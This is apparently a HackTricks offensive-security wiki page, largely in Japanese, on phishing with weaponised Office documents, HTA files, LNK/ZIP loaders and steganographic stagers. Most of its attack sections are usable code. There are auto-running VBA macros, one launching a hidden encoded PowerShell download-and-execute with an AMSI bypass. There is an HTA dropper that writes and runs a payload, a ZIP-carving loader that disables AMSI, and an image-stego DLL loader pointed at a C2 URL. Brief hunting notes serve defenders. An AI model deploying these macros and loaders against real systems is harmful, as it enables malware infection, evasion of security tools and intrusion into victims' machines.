# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Wordはファイルを開く前にファイルのデータ検証を行います。データ検証は、OfficeOpenXML標準に沿ったデータ構造の識別という形で行われます。データ構造の識別中にエラーが発生した場合、解析中のファイルは開かれません。

通常、マクロを含むWordファイルは`.docm`拡張子を使用します。しかし、拡張子を変更してファイル名を変更してもマクロ実行能力を維持できる場合があります。\
例えば、RTFファイルは設計上マクロをサポートしませんが、DOCMファイルをRTFにリネームするとMicrosoft Wordにより処理され、マクロを実行できるようになります。\
同じ内部構造とメカニズムは、Microsoft Office Suiteの全てのソフトウェア（Excel、PowerPointなど）に適用されます。

以下のコマンドを使って、いくつかのOfficeプログラムがどの拡張子を実行対象としているか確認できます:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部画像のロード

移動先: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, および **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### マクロのバックドア

ドキュメント内のマクロを使用して任意のコードを実行することが可能です。

#### 自動実行関数

これらが一般的であればあるほど、AV が検出する可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロのコード例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

File > Info > Inspect Document > Inspect Document に移動すると Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは **`.docx`** の中に macro を保存できないため、また macro 有効化 **`.docm`** 拡張子には偏見（stigma）があり（例: サムネイルアイコンに大きな `!` が表示され、一部の Web/メールゲートウェイで完全にブロックされることがあります）、したがってこの **legacy `.doc` 拡張子が最良の妥協策** です。

#### 悪意のある Macros ジェネレータ

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA ファイル

HTA は、HTML とスクリプト言語（VBScript や JScript など）を組み合わせた Windows プログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルによる制約を受けない「fully trusted」アプリケーションとして実行されます。

HTA は **`mshta.exe`** によって実行されます。これは通常 **インストール** が **Internet Explorer** とともに行われるため、**`mshta` は IE に依存** します。したがって、Internet Explorer がアンインストールされている場合、HTA は実行できなくなります。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 認証を強制する方法

NTLM 認証を「リモートで」強制する方法はいくつかあります。例えば、ユーザーがアクセスするメールや HTML に不可視の画像を追加する（HTTP の MitM でも？）ことや、フォルダを開くだけで認証をトリガーするファイルのアドレスを被害者に送る、といった方法があります。

**以下のページでこれらのアイデアやその他を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証を単に盗むだけでなく、**NTLM relay attacks**を実行できる点も忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンでは、2つの正規のデコイドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが ZIP の生バイト列の中でユニークなマーカーの後に格納されており、.lnk がそれを切り出してメモリ上で完全に実行する点にあります。

典型的なフロー（.lnk PowerShell one-liner によって実装）:

1) 一般的なパス（Desktop, Downloads, Documents, %TEMP%, %ProgramData%、およびカレントワーキングディレクトリの親）で元の ZIP を探す。  
2) ZIP のバイトを読み込み、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降のすべてが埋め込まれた PowerShell ペイロードです。  
3) ZIP を %ProgramData% にコピーし、そこで展開し、偽装用の .docx を開いて正規に見せかける。  
4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 次のステージをデオブフスケート（例: すべての # 文字を削除）し、メモリ上で実行する。  

埋め込まれたステージを切り出して実行するための PowerShell のスケルトン例:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
注意
- 配信では、しばしば信頼できる PaaS サブドメイン（例: *.herokuapp.com）を悪用し、ペイロードをゲートする（IP/UA に基づいて無害な ZIP を返す）ことがある。
- 次段階ではしばしば base64/XOR の shellcode を復号し、ディスク痕跡を最小化するために Reflection.Emit + VirtualAlloc 経由で実行する。

Persistence used in the same chain
- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer やそれを埋め込むアプリがペイロードを自動的に再起動するようにされる。詳細と即利用可能なコマンドは以下を参照:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータの末尾に ASCII マーカー文字列（例: xFIQCV）が追加された ZIP ファイル。
- .lnk が親/ユーザーフォルダを列挙して ZIP を探し、デコイ文書を開くもの。
- AMSI の改ざん（[System.Management.Automation.AmsiUtils]::amsiInitFailed を利用）。
- 長時間実行されるビジネス用スレッドが、信頼された PaaS ドメインにホストされたリンクで終わるもの。

## 画像内の Steganography 区切りペイロード（PowerShell stager）

最近の loader チェーンは難読化された JavaScript/VBS を配布し、それが Base64 の PowerShell stager をデコードして実行する。その stager は画像（しばしば GIF）をダウンロードし、ユニークな start/end マーカーの間にプレーンテキストとして隠された Base64-encoded .NET DLL を含んでいる。スクリプトはこれらの区切りを検索し（実際に観測された例: «<<sudo_png>> … <<sudo_odt>>>»）、中間のテキストを抽出して Base64 デコードしてバイト化し、アセンブリをメモリ上にロードして既知のエントリメソッドを C2 URL と共に呼び出す。

ワークフロー
- ステージ 1: アーカイブ済み JS/VBS dropper → 埋め込まれた Base64 をデコード → -nop -w hidden -ep bypass 付きで PowerShell stager を起動。
- ステージ 2: PowerShell stager → 画像をダウンロードし、マーカーで区切られた Base64 を切り出し、.NET DLL をメモリ上にロードしてそのメソッド（例: VAI）を C2 URL とオプションを渡して呼び出す。
- ステージ 3: Loader が最終ペイロードを取得し、通常は process hollowing により信頼されたバイナリ（一般的には MSBuild.exe）へ注入する。process hollowing と trusted utility proxy execution の詳細は以下を参照:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

画像から DLL を切り出して .NET メソッドをメモリ上で呼び出す PowerShell の例:

<details>
<summary>PowerShell stego ペイロード抽出器とローダー</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

注意
- これは ATT&CK T1027.003 (steganography/marker-hiding) です。マーカーはキャンペーンごとに異なります。
- アセンブリをロードする前に、AMSI/ETW bypass と string deobfuscation が一般的に適用されます。
- Hunting: ダウンロードされた画像を既知のデリミタでスキャンする。画像にアクセスして Base64 blobs を即座にデコードする PowerShell を特定する。

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し見られる初期段階は、アーカイブ内に格納された小さく高度に難読化された `.js` または `.vbs` です。唯一の目的は埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` を付けた PowerShell を起動して HTTPS 上で次段階をブートストラップすることです。

Skeleton logic (abstract):
- Read own file contents
- Locate a Base64 blob between junk strings
- Decode to ASCII PowerShell
- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`

Hunting cues
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Check the page about **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
